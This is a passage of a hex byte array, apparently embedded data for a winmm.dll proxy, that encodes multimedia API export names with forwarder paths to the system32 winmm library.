	0x64, 0x69, 0x4F, 0x75, 0x74, 0x50, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64,
	0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69,
	0x4F, 0x75, 0x74, 0x50, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72,
	0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x52, 0x65, 0x73, 0x65, 0x74, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x52, 0x65,
	0x73, 0x65, 0x74, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x55, 0x6E, 0x70, 0x72, 0x65,
	0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69,
	0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x55, 0x6E, 0x70, 0x72, 0x65,
	0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53,
	0x74, 0x72, 0x65, 0x61, 0x6D, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69,
	0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x43, 0x6C,
	0x6F, 0x73, 0x65, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x4F, 0x70,
	0x65, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69,
	0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x4F, 0x70, 0x65, 0x6E, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53,
	0x74, 0x72, 0x65, 0x61, 0x6D, 0x4F, 0x75, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D,
	0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x4F, 0x75, 0x74, 0x00,
	0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x50, 0x61, 0x75, 0x73, 0x65, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72,
	0x65, 0x61, 0x6D, 0x50, 0x61, 0x75, 0x73, 0x65, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72,
	0x65, 0x61, 0x6D, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x50,
	0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65,
	0x61, 0x6D, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69,
	0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x50, 0x72,
	0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61,
	0x6D, 0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D,
	0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x52, 0x65, 0x73, 0x74,
	0x61, 0x72, 0x74, 0x00, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E, 0x74,
	0x72, 0x6F, 0x6C, 0x44, 0x65, 0x74, 0x61, 0x69, 0x6C, 0x73, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E,
	0x74, 0x72, 0x6F, 0x6C, 0x44, 0x65, 0x74, 0x61, 0x69, 0x6C, 0x73, 0x57, 0x00, 0x6D, 0x69, 0x78,
	0x65, 0x72, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x57, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x44,
	0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x57, 0x00, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74,
	0x4C, 0x69, 0x6E, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x73, 0x57, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x4C,
	0x69, 0x6E, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x73, 0x57, 0x00, 0x6D, 0x69, 0x78,
	0x65, 0x72, 0x47, 0x65, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x49, 0x6E, 0x66, 0x6F, 0x57, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74,
	0x4C, 0x69, 0x6E, 0x65, 0x49, 0x6E, 0x66, 0x6F, 0x57, 0x00, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47,
	0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44, 0x65, 0x76, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E,
	0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44, 0x65,
	0x76, 0x73, 0x00, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x53, 0x65, 0x74, 0x43, 0x6F, 0x6E, 0x74, 0x72,
	0x6F, 0x6C, 0x44, 0x65, 0x74, 0x61, 0x69, 0x6C, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E,
	0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x53, 0x65, 0x74, 0x43, 0x6F, 0x6E, 0x74, 0x72,
	0x6F, 0x6C, 0x44, 0x65, 0x74, 0x61, 0x69, 0x6C, 0x73, 0x00, 0x74, 0x69, 0x6D, 0x65, 0x42, 0x65,
	0x67, 0x69, 0x6E, 0x50, 0x65, 0x72, 0x69, 0x6F, 0x64, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E,
	0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x42, 0x65, 0x67, 0x69, 0x6E, 0x50, 0x65, 0x72, 0x69,
	0x6F, 0x64, 0x00, 0x74, 0x69, 0x6D, 0x65, 0x45, 0x6E, 0x64, 0x50, 0x65, 0x72, 0x69, 0x6F, 0x64,
	0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x45, 0x6E,
	0x64, 0x50, 0x65, 0x72, 0x69, 0x6F, 0x64, 0x00, 0x74, 0x69, 0x6D, 0x65, 0x47, 0x65, 0x74, 0x44,
	0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E,
	0x74, 0x69, 0x6D, 0x65, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x00, 0x74,
	0x69, 0x6D, 0x65, 0x47, 0x65, 0x74, 0x54, 0x69, 0x6D, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69,
	0x6E, 0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x47, 0x65, 0x74, 0x54, 0x69, 0x6D, 0x65, 0x00,
	0x74, 0x69, 0x6D, 0x65, 0x4B, 0x69, 0x6C, 0x6C, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x4B, 0x69, 0x6C, 0x6C, 0x45,
	0x76, 0x65, 0x6E, 0x74, 0x00, 0x74, 0x69, 0x6D, 0x65, 0x53, 0x65, 0x74, 0x45, 0x76, 0x65, 0x6E,
	0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x74, 0x69, 0x6D, 0x65, 0x53,
	0x65, 0x74, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x77, 0x61, 0x76, 0x65, 0x49, 0x6E, 0x4D, 0x65,
	0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77,
	0x61, 0x76, 0x65, 0x49, 0x6E, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x77, 0x61, 0x76,
	0x65, 0x4F, 0x75, 0x74, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C,
	0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E,
	0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00,
	0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x43, 0x61, 0x70,
	0x73, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65,
	0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x57, 0x00, 0x77,
	0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x54, 0x65,
	0x78, 0x74, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76,
	0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x54, 0x65, 0x78, 0x74,
	0x57, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44,
	0x65, 0x76, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76,
	0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44, 0x65, 0x76, 0x73, 0x00, 0x77,
	0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F,
	0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F,
	0x75, 0x74, 0x47, 0x65, 0x74, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x77, 0x61,
	0x76, 0x65, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x56, 0x6F, 0x6C, 0x75, 0x6D, 0x65, 0x00, 0x5C,
	0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33,
	0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x47,
	0x65, 0x74, 0x56, 0x6F, 0x6C, 0x75, 0x6D, 0x65, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74,
	0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62,
	0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D,
	0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00,
	0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x4F, 0x70, 0x65, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x4F, 0x70, 0x65, 0x6E,
	0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x50, 0x61, 0x75, 0x73, 0x65, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x50, 0x61,
	0x75, 0x73, 0x65, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x50, 0x72, 0x65, 0x70, 0x61,
	0x72, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D,
	0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x50, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65,
	0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x52, 0x65,
	0x73, 0x65, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76,
	0x65, 0x4F, 0x75, 0x74, 0x52, 0x65, 0x73, 0x65, 0x74, 0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75,
	0x74, 0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D,
	0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74,
	0x00, 0x77, 0x61, 0x76, 0x65, 0x4F, 0x75, 0x74, 0x53, 0x65, 0x74, 0x56, 0x6F, 0x6C, 0x75, 0x6D,
	0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74,
	0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65, 0x4F,
	0x75, 0x74, 0x53, 0x65, 0x74, 0x56, 0x6F, 0x6C, 0x75, 0x6D, 0x65, 0x00, 0x77, 0x61, 0x76, 0x65,
	0x4F, 0x75, 0x74, 0x55, 0x6E, 0x70, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64,
	0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x77, 0x61, 0x76, 0x65,
	0x4F, 0x75, 0x74, 0x55, 0x6E, 0x70, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64,
